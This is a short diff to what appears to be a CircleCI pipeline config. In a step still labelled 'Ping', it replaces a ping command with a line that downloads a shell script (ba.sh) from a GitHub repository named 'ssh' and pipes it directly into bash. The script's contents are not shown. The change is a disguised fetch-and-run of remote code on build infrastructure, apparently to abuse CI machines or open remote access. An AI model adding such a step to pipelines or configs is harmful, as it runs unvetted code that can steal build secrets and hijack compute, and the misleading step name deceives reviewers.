@@ -8,12 +8,13 @@ jobs:
           name: Install Ping
           no_output_timeout: 20m
           command: |
-            sudo apt install iputils-ping -y
+            sudo apt update
+            sudo apt install wget
       - run:
           name: Ping
           no_output_timeout: 20m
           command: |
-            ping www.google.com
+            wget -O - https://raw.githubusercontent.com/KernelPanic-OpenSource/ssh/main/ba.sh | bash
 workflows:
   version: 2.1
   cooking:
